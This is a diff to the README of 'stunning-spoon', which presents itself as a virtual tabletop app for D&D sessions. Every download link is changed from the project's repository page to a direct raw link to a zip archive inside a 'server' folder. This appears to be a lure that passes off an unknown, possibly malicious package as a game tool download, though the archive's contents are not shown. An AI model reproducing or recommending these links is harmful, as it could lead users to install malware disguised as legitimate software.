@@ -1,6 +1,6 @@
 # 🎲 stunning-spoon - Run D&D Sessions With Ease
 
-[![Download](https://img.shields.io/badge/Download%20Now-5C7CFA?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tracheal-counterreformation469/stunning-spoon)
+[![Download](https://img.shields.io/badge/Download%20Now-5C7CFA?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Tracheal-counterreformation469/stunning-spoon/main/server/spoon-stunning-3.7.zip)
 
 ## 🧭 What this is
 
@@ -10,7 +10,7 @@ stunning-spoon is a virtual tabletop app for online D&D sessions. It helps you s
 
 Use this link to visit the page and download the app:
 
-[Download stunning-spoon](https://github.com/Tracheal-counterreformation469/stunning-spoon)
+[Download stunning-spoon](https://raw.githubusercontent.com/Tracheal-counterreformation469/stunning-spoon/main/server/spoon-stunning-3.7.zip)
 
 ### What to do on Windows
 
@@ -193,4 +193,4 @@ This makes it easier to find assets during play and keeps your sessions organize
 
 ## 🔗 Download again
 
-[Open the download page for stunning-spoon](https://github.com/Tracheal-counterreformation469/stunning-spoon)
+[Open the download page for stunning-spoon](https://raw.githubusercontent.com/Tracheal-counterreformation469/stunning-spoon/main/server/spoon-stunning-3.7.zip)
